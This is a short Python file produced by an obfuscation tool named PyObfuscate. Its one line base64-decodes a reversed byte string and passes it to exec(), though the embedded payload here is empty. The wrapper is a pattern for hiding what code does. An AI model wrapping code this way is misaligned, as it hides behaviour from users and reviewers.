# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Fri Aug 15 08:53:48 2025
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))